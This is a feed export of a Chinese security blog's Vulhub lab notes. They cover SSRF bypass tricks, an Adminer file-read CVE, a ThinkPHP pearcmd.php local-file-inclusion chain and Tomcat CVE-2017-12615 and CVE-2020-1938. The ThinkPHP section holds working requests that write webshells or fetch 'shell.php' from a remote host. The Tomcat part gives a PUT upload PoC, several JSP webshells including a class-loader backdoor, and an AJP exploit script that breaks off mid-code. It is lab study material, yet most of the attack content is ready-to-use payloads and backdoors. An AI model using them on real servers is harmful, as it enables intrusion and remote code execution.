href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p><p>　　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>　　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a>    推荐：<a href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p><p>　　4.可以指向任意ip的域名　 xip.io               原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</p><p>　　5.ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制） </p><p>　　6.非HTTP协议</p><p>　　7.DNS Rebinding</p><p>　　8.利用[::]绕过         http:&#x2F;&#x2F;[::]:80&#x2F; &gt;&gt;&gt; <a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>　　9.句号绕过         127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>　　10.利用302跳转绕过 </p></blockquote><blockquote><h2 id="6-6-file协议读取本地文件"><a href="#6-6-file协议读取本地文件" class="headerlink" title="6.6. file协议读取本地文件"></a>6.6. file协议读取本地文件</h2><p>这里的构成可以通过 url参数接收，去尝试请求内网资源</p><p>Windows:</p><pre><code>http://localhost/ssrf.php?url=file:///c:\\windows\\csup.txt</code></pre><p>Linux:</p><pre><code>http://localhost/ssrf.php?url=file:////etc/csup.txt</code></pre></blockquote><h2 id="CVE-2021-43008"><a href="#CVE-2021-43008" class="headerlink" title="CVE-2021-43008"></a>CVE-2021-43008</h2><p> 在其版本1.12.0到4.6.2之间存在一处因为MySQL LOAD DATA LOCAL导致的文件读取漏洞。</p><p><img src="/img/1.png" alt="img"></p><p>使用<a href="https://github.com/4ra1n/mysql-fake-server">mysql-fake-server</a>启动一个恶意的MySQL服务器。在Adminer登录页面中填写恶意服务地址和用户名<code>fileread_/etc/passwd</code></p><p>然后文件会被下载到本地，复现成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Adminer&quot;&gt;&lt;a href=&quot;#Adminer&quot; class=&quot;headerlink&quot; title=&quot;Adminer&quot;&gt;&lt;/a&gt;Adminer&lt;/h1&gt;&lt;h2 id=&quot;CVE-2021-21311&quot;&gt;&lt;a href=&quot;#CVE-2021-21311&quot; cla</summary>
      
    
    
    
    
    <category term="Adminer" scheme="https://taninluv.github.io/tags/Adminer/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub_CMS</title>
    <link href="https://taninluv.github.io/2024/11/14/Vulhub-CMS/"/>
    <id>https://taninluv.github.io/2024/11/14/Vulhub-CMS/</id>
    <published>2024-11-14T09:05:09.000Z</published>
    <updated>2024-11-14T09:05:09.070Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulhub_Frame</title>
    <link href="https://taninluv.github.io/2024/11/12/Vulhub-Frame/"/>
    <id>https://taninluv.github.io/2024/11/12/Vulhub-Frame/</id>
    <published>2024-11-12T07:21:00.000Z</published>
    <updated>2024-11-14T09:22:04.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h1><h2 id="ThinkPHP-多语言本地文件包含漏洞"><a href="#ThinkPHP-多语言本地文件包含漏洞" class="headerlink" title="ThinkPHP 多语言本地文件包含漏洞"></a>ThinkPHP 多语言本地文件包含漏洞</h2><blockquote><p>ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用<code>lang</code>参数来包含任意PHP文件。</p><p>虽然只能包含本地PHP文件，但在开启了<code>register_argc_argv</code>且安装了pcel&#x2F;pear的环境下，可以包含<code>/usr/local/lib/php/pearcmd.php</code>并写入任意文件</p></blockquote><ul><li>安装了pear（这样才能有pearcmd.php）</li><li>开启了<code>register_argc_argv</code></li><li>存在文件包含且可以包含后缀为php的文件且没有<code>open_basedir</code>的限制。</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://blog.csdn.net/RABCDXB/article/details/122050370">pearcmd.php的妙用_register argc argv-CSDN博客</a></p><p>根据博客，<strong>当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell</strong></p><p>如果目标出网：</p><pre><code>http://localhost/test.php?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</code></pre><p>直接下载shell然后包含</p><p>如果不出网：</p><pre><code>/test.php?+config-create+/&amp;file=/usr/share/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</code></pre><p>写入shell然后包含，但是这里不清楚这样为什么能写入</p><p>根据这个博客<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述 | 离别歌</a>：</p><pre><code>php pearcmd.php==&gt;...config-create</code></pre><blockquote><p>阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><p>所以，我构造出最后的利用数据包如下：</p><pre><code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1Host: 192.168.1.162:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: close</code></pre></blockquote><h3 id="追溯"><a href="#追溯" class="headerlink" title="追溯"></a>追溯</h3><p><a href="https://blog.csdn.net/rfrder/article/details/121042290">利用pearcmd.php从LFI到getshell-CSDN博客</a></p><p>通过研究这一博客，可以得知：</p><ul><li><p><code>pear</code>本身是一个sh程序</p></li><li><p>pearcmd.php中<code>$argv</code>就是通过<code>$_SERVER[&#39;argv&#39;]</code>来获取到的。</p></li><li><pre><code>root@VM-0-6-ubuntu:~/somefile# pear help optionsOptions:     -v         increase verbosity level (default 1)     -q         be quiet, decrease verbosity level     -c file    find user configuration in `file&#39;     -C file    find system configuration in `file&#39;     -d foo=bar set user config variable `foo&#39; to `bar&#39;     -D foo=bar set system config variable `foo&#39; to `bar&#39;     -G         start in graphical (Gtk) mode     -s         store user configuration     -S         store system configuration     -u foo     unset `foo&#39; in the user configuration     -h, -?     display help/usage (this message)     -V         version information</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>pear -c /tmp/.feng.php -d man_dir=&lt;?=eval($_POST[0]);?&gt; -spear install -R /tmp http://xxxxxxx/shell.php</code></pre></li></ul><p><code>&amp;</code> 在 URL 中的作用是<strong>分隔多个查询参数</strong>。在这个例子中，URL 包含多个用 <code>&amp;</code> 分隔的参数，每个参数都将被传递给 <code>pearcmd.php</code> 脚本</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ul><li>ThinkPHP 6.0.12</li></ul><p>首先，ThinkPHP多语言特性不是默认开启的，所以我们可以尝试包含<code>public/index.php</code>文件来确认文件包含漏洞是否存在</p><p>如果漏洞存在，则服务器会出错，返回500页面。</p><p>文件包含漏洞存在的情况下还需要服务器满足下面两个条件才能利用：</p><ol><li>PHP环境开启了<code>register_argc_argv</code></li><li>PHP环境安装了pcel&#x2F;pear</li></ol><h4 id="exp1-写文件-开启段标签"><a href="#exp1-写文件-开启段标签" class="headerlink" title="exp1:写文件(开启段标签)"></a>exp1:写文件(开启段标签)</h4><pre><code>/?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>CONFIGURATION (CHANNEL PEAR.PHP.NET): ===================================== Auto-discover new Channels auto_discover Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy PEAR server [DEPRECATED] master_server Default Channel Mirror preferred_mirror Remote Configuration File remote_config PEAR executables directory bin_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear PEAR documentation directory doc_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/docs PHP extension directory ext_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/ext PEAR directory php_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php PEAR Installer cache directory cache_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cache PEAR configuration file cfg_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cfg directory PEAR data directory data_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/data PEAR Installer download download_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/download directory Systems manpage files man_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/man directory PEAR metadata directory metadata_dir PHP CLI/CGI binary php_bin php.ini location php_ini --program-prefix passed to php_prefix PHP&#39;s ./configure --program-suffix passed to php_suffix PHP&#39;s ./configure PEAR Installer temp directory temp_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/temp PEAR test directory test_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/tests PEAR www files directory www_dir /&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/www Cache TimeToLive cache_ttl Preferred Package State preferred_state Unix file mask umask Debug Log Level verbose PEAR password (for password maintainers) Signature Handling Program sig_bin Signature Key Directory sig_keydir Signature Key Id sig_keyid Package Signature Type sig_type PEAR username (for username maintainers) User Configuration File Filename /var/www/public/shell.php System Configuration File Filename #no#system#config# Successfully created default configuration file &quot;/var/www/public/shell.php&quot; </code></pre><p>根据末尾看见写入成功</p><p>但是此时直接访问shell.php:</p><pre><code>#PEAR_Config 0.9 a:12:&#123;s:7:&quot;php_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/php&quot;;s:8:&quot;data_dir&quot;;s:95:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/data&quot;;s:7:&quot;www_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:95:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:96:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:96:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:99:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:95:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:90:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear&quot;;s:7:&quot;man_dir&quot;;s:94:&quot;/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=phpinfo()?%3E/pear/man&quot;;&#125;</code></pre><p>可以看到结尾，写入的字符被编码了，可能是浏览器自动编码，抓包写入一下，此时写入成功了</p><h4 id="exp1-2-写文件-开启段标签"><a href="#exp1-2-写文件-开启段标签" class="headerlink" title="exp1.2:写文件(开启段标签)"></a>exp1.2:写文件(开启段标签)</h4><pre><code>?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/.feng.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+</code></pre><p>这里为了方便，写入phpinfo()：</p><pre><code>?lang=../../../../../../../../../../../usr/local/lib/php/pearcmd.php&amp;+-c+shell2.php+-d+man_dir=&lt;?php phpinfo();?&gt;+-s+</code></pre><p>但是这个paylaod好像有问题，无法复现成功</p><h4 id="exp2：下载shell（不需要短标签）"><a href="#exp2：下载shell（不需要短标签）" class="headerlink" title="exp2：下载shell（不需要短标签）"></a>exp2：下载shell（不需要短标签）</h4><pre><code>pearcmd.php&amp;+install+-R+/tmp+http://vps/hello.php</code></pre><p>&#x3D;&#x3D;&gt; </p><pre><code>downloading hello.php ...Starting to download hello.php (0 bytes)...done: 0 bytescould not extract the package.xml file from &quot;/tmp/tmp/pear/download/hello.php&quot;Download of &quot;http://172.20.10.4:8000/hello.php&quot; succeeded, but it is not a valid package archiveInvalid or missing remote package fileinstall failedWarning: unlink(/tmp/tmp/pear/temp/pear1cgS9N): No such file or directory in System.php on line 225</code></pre><p>将-R的参数改为<code>./</code>即可通过网站访问<code>/tmp/pear/download/hello.php</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Thinkphp&quot;&gt;&lt;a href=&quot;#Thinkphp&quot; class=&quot;headerlink&quot; title=&quot;Thinkphp&quot;&gt;&lt;/a&gt;Thinkphp&lt;/h1&gt;&lt;h2 id=&quot;ThinkPHP-多语言本地文件包含漏洞&quot;&gt;&lt;a href=&quot;#ThinkPHP-</summary>
      
    
    
    
    
    <category term="Vulhub" scheme="https://taninluv.github.io/tags/Vulhub/"/>
    
    <category term="Frame" scheme="https://taninluv.github.io/tags/Frame/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub_Middleware</title>
    <link href="https://taninluv.github.io/2024/11/05/Vulnhub-Middleware/"/>
    <id>https://taninluv.github.io/2024/11/05/Vulnhub-Middleware/</id>
    <published>2024-11-05T14:32:35.000Z</published>
    <updated>2024-11-17T03:45:14.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h1><p>由于最近也不知道该学什么，怎么学，最关键是要不要学，很迷茫。</p><p>之前培训以及前两天跟同事交流都提到了vulhub这个玩意儿，以前看过这东西但是看了两眼觉得只是一些比较老的cve和一个比较方便的普通web靶场，没有想到还可以当知识库使用，这两天仔细看了发现还是有一些比较新的cve，看起来也是持续更新的，于是稍微琢磨了一下，打算先走一下常见中间件的cve，光有个数据库恐怕是不行的，就怕看见了但是认不出来hhh。反正没什么事儿，每天有空了花几分钟搞一个先弄着走吧。。。</p><h1 id="我的环境问题"><a href="#我的环境问题" class="headerlink" title="我的环境问题"></a>我的环境问题</h1><pre><code>─# docker-compose up -dTraceback (most recent call last):  File &quot;/usr/lib/python3/dist-packages/docker/api/client.py&quot;, line 214, in _retrieve_server_version    return self.version(api_version=False)[&quot;ApiVersion&quot;]           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  File &quot;/usr/lib/python3/dist-packages/docker/api/daemon.py&quot;, line 181, in version    return self._result(self._get(url), json=True)                        ^^^^^^^^^^^^^^  File &quot;/usr/lib/python3/dist-packages/docker/utils/decorators.py&quot;, line 46, in inner    return f(self, *args, **kwargs)</code></pre><p>环境来就报错，真的无语，干脆不用docker-composer了，可以给docker安装composer插件：</p><pre><code>mkdir -p ~/.docker/cli-plugins/curl -SL https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m) -o ~/.docker/cli-plugins/docker-composechmod +x ~/.docker/cli-plugins/docker-compose</code></pre><p>然后</p><pre><code>docker compose up -d </code></pre><p>但是：</p><pre><code>proxychains docker compose up -d[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16WARN[0000] /root/work/Vulnhub/vulhub/tomcat/CVE-2017-12615/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion [+] Building 30.4s (3/3) FINISHED                                                                                              docker:default =&gt; [tomcat internal] load build definition from Dockerfile                                                                              0.0s =&gt; =&gt; transferring dockerfile: 32B                                                                                                      0.0s  =&gt; [tomcat internal] load .dockerignore                                                                                                 0.0s  =&gt; =&gt; transferring context: 2B                                                                                                          0.0s  =&gt; ERROR [tomcat internal] load metadata for docker.io/vulhub/tomcat:8.5.19                                                            30.1s ------ &gt; [tomcat internal] load metadata for docker.io/vulhub/tomcat:8.5.19:------failed to solve: rpc error: code = Unknown desc = failed to solve with frontend dockerfile.v0: failed to create LLB definition: failed to do request: Head &quot;https://docker.mirrors.ustc.edu.cn/v2/vulhub/tomcat/manifests/8.5.19?ns=docker.io&quot;: dial tcp 127.0.0.2:443: connect: connection refused</code></pre><p>习惯了，换个源试试：<code>/etc/docker/daemon.json</code></p><pre><code>&#123;  &quot;registry-mirrors&quot;: [    &quot;https://registry.docker-cn.com&quot;,    &quot;https://mirror.aliyuncs.com&quot;  ]&#125;</code></pre><p>还是报错，真无语了，重新弄了一个虚拟机，还是docker不了，相似。两点了，睡了。</p><p>今天随便找了一个快照回退回去，笑死，<code>docker-compose</code>没报错。。。</p><p>这是使用的镜像：</p><pre><code>&#123;&quot;registry-mirrors&quot;: [&quot;https://docker.m.daocloud.io&quot;,&quot;https://dockerproxy.com&quot;,&quot;https://docker.mirrors.ustc.edu.cn&quot;,&quot;https://docker.nju.edu.cn&quot;,&quot;http://hammal.staronearth.win/&quot;,&quot;http://hub.staronearth.win/&quot;]&#125;</code></pre><p>网上随便复制一个，今天居然跑起来了泪目。。。</p><blockquote><h3 id="1-停止并删除所有容器"><a href="#1-停止并删除所有容器" class="headerlink" title="1. 停止并删除所有容器"></a>1. 停止并删除所有容器</h3><pre><code>docker stop $(docker ps -aq)docker rm $(docker ps -aq)</code></pre><ul><li><code>docker ps -aq</code> 列出所有容器的 ID，包括已停止的容器。</li><li>这两条命令会先停止，然后删除所有容器。</li></ul><h3 id="2-删除所有镜像"><a href="#2-删除所有镜像" class="headerlink" title="2. 删除所有镜像"></a>2. 删除所有镜像</h3><pre><code>bash复制代码docker rmi $(docker images -q)</code></pre><ul><li><code>docker images -q</code> 列出所有镜像的 ID。</li><li>这条命令会删除所有镜像。如果有依赖关系，可能会出现错误。</li></ul><h3 id="如果想确保删除所有无用的资源，可以使用以下清理命令："><a href="#如果想确保删除所有无用的资源，可以使用以下清理命令：" class="headerlink" title="如果想确保删除所有无用的资源，可以使用以下清理命令："></a>如果想确保删除所有无用的资源，可以使用以下清理命令：</h3><pre><code>bash复制代码docker system prune -a</code></pre><ul><li><code>docker system prune -a</code> 会删除所有未被使用的镜像、容器、网络和挂载卷。</li></ul></blockquote><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="CVE-2017-12615-文件上传"><a href="#CVE-2017-12615-文件上传" class="headerlink" title="CVE-2017-12615 文件上传"></a>CVE-2017-12615 文件上传</h2><p>容器终于起来了，进去看看：</p><pre><code>docker exec -it &lt;container_id&gt; /bin/bash</code></pre><p>跟着几个哥们装模做样审一下吧，我也不知道咋学：</p><blockquote><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e">Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass</a></li></ul></blockquote><blockquote><p>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。 </p></blockquote><p>找到这个出现漏洞的配置：</p><pre><code>root@673198ebed27:/usr/local/tomcat/conf# cat web.xml |grep readonly  &lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</code></pre><p>刚开始没找到，有好几个web.xml:</p><pre><code>root@673198ebed27:/usr/local/tomcat# grep -ril &quot;readonly&quot; ../conf/web.xml</code></pre><p>看了一下各位师傅的代码审计，因为看不懂所以只学到了一手：</p><p><img src="/img/image-20241106225015867.png" alt="image-20241106225015867"></p><p><img src="/img/image-20241106224846391.png" alt="image-20241106224846391"></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20241106225154840.png" alt="image-20241106225154840"></p><p>这里可以看到File对name进行了格式化，最后效果是删除了最后的<code>/</code></p><blockquote><p><strong>影响</strong> </p><p>由于存在去掉最后的 &#x2F; 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 无不中枪。目前来说，最好的解决方式是将 conf&#x2F;web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞。</p></blockquote><blockquote><p>然而，经过黑盒测试，当 PUT 地址为&#x2F;1.jsp&#x2F;时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁</p></blockquote><p>由于后端会删除末尾的<code>/</code>，那我们在前面上传的时候可以添加<code>/</code>来绕过文件名的校验，由此可以展开到其他地方的bypass。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>PUT /1.jsp/ HTTP/1.1Host: your-ip:8080Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5shell</code></pre><p><img src="/img/image-20241106230030476.png" alt="image-20241106230030476"></p><h3 id="jsp木马"><a href="#jsp木马" class="headerlink" title="jsp木马"></a>jsp木马</h3><p>这里顺带学一下jsp木马</p><p><a href="https://blog.csdn.net/m0_46317063/article/details/128816033">java安全——jsp一句话木马_cmd写jsp一句话-CSDN博客</a></p><p>无回显：</p><pre><code> &lt;%    Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</code></pre><p>带回显：</p><pre><code>  &lt;%    Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));    System.out.println(process);    InputStream inputStream = process.getInputStream();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));    String line;    while ((line = bufferedReader.readLine()) != null)&#123;      response.getWriter().println(line);    &#125;  %&gt;</code></pre><p>这个好像用不了，又找了一个：</p><pre><code>&lt;%!    class U extends ClassLoader &#123;        U(ClassLoader c) &#123;            super(c);        &#125;        public Class g(byte[] b) &#123;            return super.defineClass(b, 0, b.length);        &#125;    &#125;     public byte[] base64Decode(String str) throws Exception &#123;        try &#123;            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);        &#125; catch (Exception e) &#123;            Class clazz = Class.forName(&quot;java.util.Base64&quot;);            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls = request.getParameter(&quot;passwd&quot;);    if (cls != null) &#123;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    &#125;%&gt;</code></pre><p>后面这个可以连接但是无法直接执行，找个时间研究一下jsp码。</p><p>有密码带回显：</p><pre><code>  &lt;%    if (&quot;password&quot;.equals(request.getParameter(&quot;pass&quot;)))&#123;      Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));//    System.out.println(process);      InputStream inputStream = process.getInputStream();      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));      String line;      while ((line = bufferedReader.readLine()) != null)&#123;        response.getWriter().println(line);      &#125;    &#125;  %&gt;//pass=password&amp;cmd=xxx</code></pre><p>这里还涉及到：</p><blockquote><h3 id="让-Burp-Suite-自动管理-Content-Length"><a href="#让-Burp-Suite-自动管理-Content-Length" class="headerlink" title="让 Burp Suite 自动管理 Content-Length"></a>让 Burp Suite 自动管理 <code>Content-Length</code></h3><p>Burp Suite 提供了自动计算 <code>Content-Length</code> 的功能：</p><ol><li>在 Burp Suite 中，点击 <strong>Proxy</strong> &gt; <strong>Options</strong>。</li><li>找到 <strong>Intercept Client Requests</strong> 设置下的 <strong>Match and Replace</strong> 规则。</li><li>添加一个新的 <code>Header: Content-Length</code> 自动更新规则，或启用默认设置的自动计算规则。这样在发送请求时，Burp Suite 会自动根据修改后的请求体计算并更新 <code>Content-Length</code> 字段。</li></ol></blockquote><h2 id="CVE-2020-1938-文件包含"><a href="#CVE-2020-1938-文件包含" class="headerlink" title="CVE-2020-1938 文件包含"></a>CVE-2020-1938 文件包含</h2><blockquote><p>漏洞影响的产品版本包括：</p><p>Tomcat 6</p><p>Tomcat 7</p><p>Tomcat 8</p><p>Tomcat 9</p><p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p></blockquote><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><details>    <summary>poc.py</summary>    #!/usr/bin/env python#CNVD-2020-10487  Tomcat-Ajp lfi#by ydhcuiimport struct# Some references:# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.htmldef pack_string(s):        if s is None:                return struct.pack(">h", -1)        l = len(s)        return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)def unpack(stream, fmt):        size = struct.calcsize(fmt)        buf = stream.read(size)        return struct.unpack(fmt, buf)def unpack_string(stream):        size, = unpack(stream, ">h")        if size == -1: # null string                return None        res, = unpack(stream, "%ds" % size)        stream.read(1) # \0        return resclass NotFoundException(Exception):        passclass AjpBodyRequest(object):        # server == web server, container == servlet        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)        MAX_REQUEST_LENGTH = 8186        def __init__(self, data_stream, data_len, data_direction=None):                self.data_stream = data_stream                self.data_len = data_len                self.data_direction = data_direction        def serialize(self):                data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)                if len(data) == 0:                        return struct.pack(">bbH", 0x12, 0x34, 0x00)                else:                        res = struct.pack(">H", len(data))                        res += data                if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:                        header = struct.pack(">bbH", 0x12, 0x34, len(res))                else:                        header = struct.pack(">bbH", 0x41, 0x42, len(res))                return header + res        def send_and_receive(self, socket, stream):                while True:                        data = self.serialize()                        socket.send(data)                        r = AjpResponse.receive(stream)                        while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:                                r = AjpResponse.receive(stream)                        if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:                                breakclass AjpForwardRequest(object):        _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)        REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}        # server == web server, container == servlet        SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)        COMMON_HEADERS = ["SC_REQ_ACCEPT",                "SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",                "SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",                "SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"        ]        ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]        def __init__(self, data_direction=None):                self.prefix_code = 0x02                self.method = None                self.protocol = None                self.req_uri = None                self.remote_addr = None                self.remote_host = None                self.server_name = None                self.server_port = None                self.is_ssl = None                self.num_headers = None                self.request_headers = None                self.attributes = None                self.data_direction = data_direction        def pack_headers(self):                self.num_headers = len(self.request_headers)                res = ""                res = struct.pack(">h", self.num_headers)                for h_name in self.request_headers:                        if 